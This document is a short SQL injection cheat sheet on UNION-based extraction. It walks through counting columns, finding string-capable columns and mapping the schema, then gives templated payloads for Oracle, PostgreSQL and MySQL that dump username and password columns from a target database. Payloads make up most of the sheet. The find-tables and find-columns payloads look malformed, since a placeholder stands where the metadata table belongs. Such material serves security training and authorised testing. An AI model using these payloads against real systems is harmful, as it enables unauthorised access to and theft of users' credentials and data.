# SQLi: In-Band UNION Extraction

**Category:** SQL Injection

**Sub-Category:** In-Band / Visible

**Logic:** Appending a second result set to a legitimate query to reflect database contents in the UI.

---

## Methodology

### 1. Identify Column Count

Increment the number until an error occurs or content disappears:

* `' ORDER BY 1--`
* `' ORDER BY 2--` ...

### 2. Fingerprint Data Types

Test which columns can hold strings (the most common exfiltration type):

* `' UNION SELECT 'a', NULL, NULL--`
* `' UNION SELECT NULL, 'a', NULL--`

### 3. Map Schema & Extract

Use the database-specific syntax below to find tables, then columns, then data.

---

## Syntax Reference 

| Database | Metadata Table | Column Table | String Concat | Note |
| --- | --- | --- | --- | --- |
| **Oracle** | `all_tables` | `all_tab_columns` | `'a'||'b'` | **Must** use `FROM dual` |
| **PostgreSQL** | `information_schema.tables` | `information_schema.columns` | `'a'||'b'` |  |
| **MySQL** | `information_schema.tables` | `information_schema.columns` | `CONCAT('a','b')` | Space after `-- ` |

---

## General Payloads

**Find Tables:**

```sql
' UNION SELECT table_name, NULL [FROM_DUAL] WHERE table_name LIKE '%user%'--
```

**Find Columns:**

```sql
' UNION SELECT column_name, NULL [FROM_DUAL] WHERE table_name = '{{TARGET_TABLE}}'--
```

**Dump Data:**

```sql
' UNION SELECT {{USERNAME_COL}}, {{PASSWORD_COL}} FROM {{TARGET_TABLE}}--
```

---

## Technical Caveats

* **Case Sensitivity:** Oracle metadata is `UPPERCASE`. PostgreSQL/MySQL are typically `lowercase`.
* **The `dual` Requirement:** If the target is Oracle, every `SELECT` must have a `FROM`. Use `FROM dual` for your testing queries.
* **Single Column Constraint:** If only one column is visible, use **String Aggregation** (e.g., `username || ':' || password`) to pull multiple fields at once.
